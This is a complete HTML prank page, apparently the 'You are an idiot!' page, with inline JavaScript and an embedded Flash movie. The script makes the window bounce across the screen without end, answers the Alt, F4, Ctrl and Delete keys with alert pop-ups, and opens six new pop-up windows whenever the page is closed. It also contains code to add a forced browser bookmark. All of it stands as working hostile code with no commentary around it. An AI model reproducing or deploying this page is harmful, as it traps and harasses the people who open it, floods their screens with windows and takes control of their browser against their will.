<html>
<head>
<title>You are an idiot!</title>
<script language=Javascript>

function bookmark() {
		if ((navigator.appName == "Microsoft Internet Explorer") 
		&& (parseInt(navigator.appVersion) >= 4)) 
		{
		var url="http://offiz.bei.t-online.de/idiot.html";
		var title="Idiot!";
		window.external.AddFavorite(url,title);
		}
		}

function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) alert("You are an idiot!"); }
function ctrlkey() { if (event.keyCode == 17) alert("You are an idiot!"); }
function delkey() { if (event.keyCode == 46) alert("You are an idiot!"); }

		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function openWindow(url){
        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

function procreate(){
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		}

function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
function fOff(){
        flagrun = 0;
        }

function playBall(){
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width-175){
        newXlt();
        }
        if (xPos < 0){
        newXrt();
        }
        if (yPos > screen.height-100){
        newYup();
        }
        if (yPos < 0){
        newYdn();
        }
        if (flagRun == 1){
        window.moveTo(xPos,yPos);
        setTimeout('playBall()',1);
        }
        }

</script>
</head>
<body bgColor=#ffffff onload="flagRun=1;playBall();return true;bookmark();" onKeyDown="altf4key();ctrlkey();delkey();" onUnLoad="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="100%" height="100%">
  <param name=movie value="youare.swf">
  <param name=quality value=high>
  <embed src="youare.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="100%" height="100%">
  </embed> 
</object> 
</body>
</html>
